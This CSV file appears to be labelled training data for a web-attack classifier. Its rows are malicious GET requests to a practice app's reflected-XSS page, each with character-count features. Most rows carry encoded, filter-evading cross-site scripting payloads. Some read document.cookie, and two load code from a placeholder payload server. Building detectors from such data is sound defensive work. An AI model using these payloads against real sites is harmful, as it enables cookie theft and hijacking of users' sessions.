method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22kcf%3Aexpression%28alert%281%29%29%22%3E%3C%2Fdiv%3E,,0,2,0,2,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3Djava%26%231%26%232%26%233%26%234%26%235%26%236%26%237%26%238%26%2311%26%2312script%3Ajavascript%3Aalert%281%29%3EKCF%3C%2Fa%3E,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22kcf%3Aexpression%28alert%281%29%29%22%3Ekcf%2Fdiv%3E,,0,2,0,2,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%251Ajavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22jav%26%2397ascript%3Ajavascript%3Aalert%281%29%22%3Etest1%3C%2Fa%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%5C%27%3E%3Cbody+onload%3D%5C%27KCF%5C%27%3E,,3,0,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%27%60%22%3E%3C%253Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onunload+body+onunload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onunload%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%2500cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CDIV+STYLE%3D%22background-image%3A%5C0075%5C0072%5C006C%5C0028%27%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028.1027%5C0058.1053%5C0053%5C0027%5C0029%27%5C0029%22%3E,,2,2,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3D%22x%22%3Ex%3C%2Fdiv%3E+%3Cxml%3Anamespace+prefix%3D%22t%22%3E+%3Cimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+targetElement%3D%22x%22+to%3D%22%3Cimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%3E%22%3E,,0,14,0,1,10,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%250Bjavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Carticle+xmlns%3D%22x%3Aimg+src%3Dx+onerror%3Dalert%281%29+%22%3E,,0,2,0,1,4,3,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%25E2%2580%2586expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+style%3D%22-o-link%3A%27javascript%3Aalert%281%29%27%3B-o-link-source%3Acurrent%22%3EX%3C%2Fa%3E,,2,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Ajavascript%3Aalert%281%29%29%22%3E,,0,2,0,2,2,6,bad
GET,/vulnerabilities/xss_r/?name=%22%27%60%3EABC%3Cdiv+style%3D%22font-family%3A%27foo%27%253Bx%3Aexpression%28javascript%3Aalert%281%29%3B%2F*%27%3B%22%3EDEF,,4,3,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2508javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22invalid%3A1%22+id%3Dx+name%3Dy%3Etest%3C%2Fa%3E%3Ca+href%3D%22invalid%3A2%22+id%3Dx+name%3Dy%3Etest%3C%2Fa%3E%3Cscript%3Ealert%28x.y%5B0%5D%29%3C%2Fscript%3E,,0,4,0,1,6,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cbgsound+onpropertychange%3Dalert%281%29%3E,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%2525%3Bheight%3A100%2525%22+onmouseover%3D%22prompt%281%29%22+onclick%3D%22alert%281%29%22%3Ex%3C%2Fbutton%3E,,0,6,0,2,3,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onscroll%3Djavascript%3Aalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput+autofocus%3E,,0,0,0,1,2,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onscroll%3Dalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput+autofocus%3E,,0,0,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22list-style%3Aurl%28http%3A%2F%2Ffoo.f%29%5C20url%28javascript%3Ajavascript%3Aalert%281%29%29%3B%22%3EX,,0,2,0,3,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E,,0,0,0,0,3,0,bad
GET,/vulnerabilities/xss_r/?name=alert%28String.fromCharCode%2875%2C67%2C70%29%29%2F%2F%22%3Balert%28String.fromCharCode%2875%2C67%2C70%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C%2FSCRIPT%3E,,1,2,1,6,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onbeforeactivate%3Dalert%281%29%3E,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22jAvAsCrIpT%26colon%3Balert%26lpar%3B1%26rpar%3B%22%3EX%3C%2Fa%3E,,0,2,0,0,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%251Ejavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=1%3Ca+href%3D%23%3E%3Cline+xmlns%3Durn%3Aschemas-microsoft-com%3Avml+style%3Dbehavior%3Aurl%28%23default%23vml%29%3Bposition%3Aabsolute+href%3Djavascript%3Ajavascript%3Aalert%281%29+strokecolor%3Dwhite+strokeweight%3D1000px+from%3D0+to%3D1000+%2F%3E%3C%2Fa%3E,,0,0,0,2,9,8,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+oninput%3Dprompt%281%29%3E%3Cinput+autofocus%3E,,0,0,0,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2FXXXxenotixXXX%3A3555%2Fxss_serve_payloads%2Fkcf.html%27%22%3EKCF%3C%2FA%3E,,2,2,0,0,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onfocusin%3Dalert%281%29%3E,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%251Djavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
POST,/login.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onFocus+body+onFocus%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onFocus%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Carticle+xmlns%3D%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%22%3E%3C%2Farticle%3E,,0,2,0,1,3,3,bad
GET,/vulnerabilities/xss_r/?name=%5C%5C%5C%27%3E%3Cbody+onload%3D%5C%5C%5C%271%5C%5C%5C%27%3E,,3,0,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+oninput%3Djavascript%3Aalert%281%29%3E%3Cinput+autofocus%3E,,0,0,0,1,2,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D1+name%3Dx%3Etest%3C%2Fa%3E%3Ca+href%3D1+name%3Dx%3Etest%3C%2Fa%3E%3Cscript%3Ealert%28x.removeChild%29alert%28x.parentNode%29%3C%2Fscript%3E,,0,0,0,2,4,8,bad
GET,/vulnerabilities/xss_r/?name=--%3E%3C%21--+--%253E%3E+%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E,,0,0,4,1,5,5,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%25E2%2580%2587expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onscroll%3Dprompt%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput+autofocus%3E,,0,0,0,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%250Dexpression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2509javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3Aexp%2500ression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%2501cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2519javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onPageHide+body+onPageHide%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onPageHide%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=1%3Ca+href%3D%23%3E%3Cline+xmlns%3Durn%3Aschemas-microsoft-com%3Avml+style%3Dbehavior%3Aurl%28%23default%23vml%29%3Bposition%3Aabsolute+href%3Djavascript%3Aalert%281%29+strokecolor%3Dwhite+strokeweight%3D1000px+from%3D0+to%3D1000+%2F%3E%3C%2Fa%3E,,0,0,0,2,9,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onMouseOver+body+onMouseOver%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onMouseOver%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onload%3D%22alert%281%29%3B%22%3E,,0,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27KCF%27%29%3B%22%3E,,2,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=1%3Cset%2Fxmlns%3D%60urn%3Aschemas-microsoft-com%3Atime%60+style%3D%60beh%26%23x41vior%3Aurl%28%23default%23time2%29%60+attributename%3D%60innerhtml%60+to%3D%60%3Cimg%2Fsrc%3D%26quot%3Bx%26quot%3Bonerror%3Dalert%281%29%3E%60%3E,,0,0,0,2,3,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onfocus+body+onfocus%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onfocus%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3CBODY+ONLOAD%3Dalert%281%29%3E,,0,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%253cimg+onerror%3Dalert%281%29+src%3Da%253e,,0,0,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onMouseEnter+body+onMouseEnter%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onMouseEnter%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=1%3Cvmlframe+xmlns%3Durn%3Aschemas-microsoft-com%3Avml+style%3Dbehavior%3Aurl%28%23default%23vml%29%3Bposition%3Aabsolute%3Bwidth%3A100%2525%3Bheight%3A100%2525+src%3Dtest.vml%23kcf%3E%3C%2Fvmlframe%3E,,0,0,0,1,3,1,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2516javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=1%3Canimate%2Fxmlns%3Durn%3Aschemas-microsoft-com%3Atime+style%3Dbehavior%3Aurl%28%23default%23time2%29+attributename%3Dinnerhtml+values%3D%3Cimg%2Fsrc%3D%26quot%3B.%26quot%3Bonerror%3Dalert%281%29%3E%3E,,0,0,0,2,3,5,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%2509expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3CBASE+HREF%3D%22javascript%3Aalert%281%29%3B%2F%2F%22%3E,,0,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2512javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2507javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3Aexp%255Cression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,4,bad
GET,/vulnerabilities/xss_r/?name=%253Cform%2520onmouseover%253Dalert%281%29%253E%253Cinput%2520name%253Dattributes%253E,,0,0,0,1,0,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%250Ccript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3Dd%3E%3Cx+xmlns%3D%22%3E%3Ciframe+onload%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cscript%3Ed.innerHTML%3Dd.innerHTML%3C%2Fscript%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22data%3Atext%2Fhtml%3Bblabla%2C%26%2360%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2332%26%23115%26%23114%26%2399%26%2361%26%2334%26%23104%26%23116%26%23116%26%23112%26%2358%26%2347%26%2347%26%23115%26%23116%26%23101%26%23114%26%23110%26%23101%26%23102%26%2397%26%23109%26%23105%26%23108%26%23121%26%2346%26%23110%26%23101%26%23116%26%2347%26%23102%26%23111%26%23111%26%2346%26%23106%26%23115%26%2334%26%2362%26%2360%26%2347%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2362%26%238203%22%3EKCF%3C%2Fa%3E,,0,2,0,0,1,1,bad
GET,/vulnerabilities/xss_r/?name=%3Cbutton%2Fonclick%3Dalert%281%29+%3EKCF%3C%2Fbutton%3E,,0,0,0,1,1,2,bad
GET,/login.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%250Acript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3D%22alert%28%27%2Fkcf%2F%27%29%22+style%3D%22x%3Aexpression%28eval%29%28id%29%22%3E,,2,4,0,3,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+aa+aaa+aaaa+aaaaa+aaaaaa+aaaaaaa+aaaaaaaa++aaaaaaaaa+aaaaaaaaaa++href%3Dj%26%2397v%26%2397script%26%23x3A%3B%26%2397lert%281%29%3EClickMe,,0,0,0,1,12,2,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%25E2%2580%258Aexpression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2502javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%25EF%25BB%25BFexpression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%22%3E%3Cbody+onload%3D%22KCF%22%3E,,0,3,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3Aexpression%2500%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Capplet+onError+applet+onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fapplet+onError%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22binding%3A+url%28http%3A%2F%2FXXXxenotixXXX%3A3555%2Fxss_serve_payloads%2Fkcf.html%29%29%3B%22%3E,,0,2,0,1,2,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22%5C63%26%239%5C06f%26%2310%5C0006c%26%2312%5C00006F%26%2313%5CR%3A%5C000072+Ed%3Bcolor%5C0%5Cbla%3Ayellow%5C0%5Cbla%3Bcol%5C0%5C00+%5C%26%23xA0or%3Ablue%3B%22%3EXXX%3C%2Fdiv%3E,,0,2,0,0,3,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%2502cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+onmouseover%3D%22alert%28document.cookie%29%22%3Ekcf+link%3C%2Fa%3E,,0,2,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onPopState+body+onPopState%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onPopState%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+style%3D%22pointer-events%3Anone%3Bposition%3Aabsolute%3B%22%3E%3Ca+style%3D%22position%3Aabsolute%3B%22+onclick%3D%22alert%281%29%3B%22%3EXXX%3C%2Fa%3E%3C%2Fa%3E%3Ca+href%3D%22javascript%3Aalert%282%29%22%3EXXX%3C%2Fa%3E,,0,8,0,2,4,7,bad
GET,/vulnerabilities/xss_r/?name=%5Bdata+%221%3Cdiv+style%3Dwidth%3Aexpression%28prompt%281%29%29%3E%22%5D,,0,2,0,2,2,1,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%250Bcript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2517javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Bcookie%26rpar%3B%3EKCF%3C%2Fa%3E,,0,0,0,0,1,5,bad
GET,/vulnerabilities/xss_r/?name=data%3Atext%2Fhtml%2C%253Cscript%253Ealert%281%29%253C%252Fscript%253E,,0,0,0,1,0,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3Dd%3E%3Cdiv+style%3D%22font-family%3A%27sans%5C27%5C3B+color%5C3Ared%5C3B%27%22%3EX%3C%2Fdiv%3E%3C%2Fdiv%3E+%3Cscript%3Ewith%28document.getElementById%28%22d%22%29%29innerHTML%3DinnerHTML%3C%2Fscript%3E,,2,4,0,2,4,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22123%22+id%3Dx%3Ekcf%3C%2Fa%3E%3Cscript%3Ex%3D%27javascript%3Aalert%281%29%27%2F%2Fonly+in+compat%21%3B%3C%2Fscript%3E,,2,2,0,1,4,7,bad
GET,/vulnerabilities/xss_r/?name=1%3Canimate%2Fxmlns%3Durn%3Aschemas-microsoft-com%3Atime+style%3Dbehavior%3Aurl%28%23default%23time2%29+attributename%3Dinnerhtml+values%3D%3Cimg%2Fsrc%3D%26quot%3B.%26quot%3Bonerror%3Djavascript%3Aalert%281%29%3E%3E,,0,0,0,2,3,7,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22color%3Ared%27%7B%7D+x%3Aexpression%28alert%281%29%29%22%3E.%3C%2Fdiv%3E,,1,2,0,2,2,3,bad
GET,/vulnerabilities/xss_r/?name=1%3Cset%2Fxmlns%3D%60urn%3Aschemas-microsoft-com%3Atime%60+style%3D%60beh%26%23x41vior%3Aurl%28%23default%23time2%29%60+attributename%3D%60innerhtml%60+to%3D%60%3Cimg%2Fsrc%3D%26quot%3Bx%26quot%3Bonerror%3Djavascript%3Aalert%281%29%3E%60%3E,,0,0,0,2,3,7,bad
GET,/vulnerabilities/xss_r/?name=%3CBASE+HREF%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%2F%2F%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%2505javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%250Ajavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%251Fjavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,4,bad
GET,/vulnerabilities/xss_r/?name=%27%60%22%3E%3C%2500script%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=0%3F%3Cscript%3EWorker%28%22%23%22%29.onmessage%3Dfunction%28_%29eval%28_.data%29%3C%2Fscript%3E+%3ApostMessage%28importScripts%28%27data%3A%3Bbase64%2CcG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk%27%29%29,,2,2,0,5,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Faudio%3E,,0,2,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onpagehide+body+onpagehide%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onpagehide%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%250Fjavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+STYLE%3D%22KCF%3Aexpr%2F*KCF*%2Fession%28alert%281%29%29%22%3E,,0,2,0,2,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22blah%3E%22+onmouseover%3D%22alert%281%29%3B%22%3E,,0,4,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%2F%2F%22%3E,,0,2,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+language%3Dvbs+src%3D%3Cb+onerror%3Dalert%231%2F1%23%3E,,0,0,0,0,3,3,bad
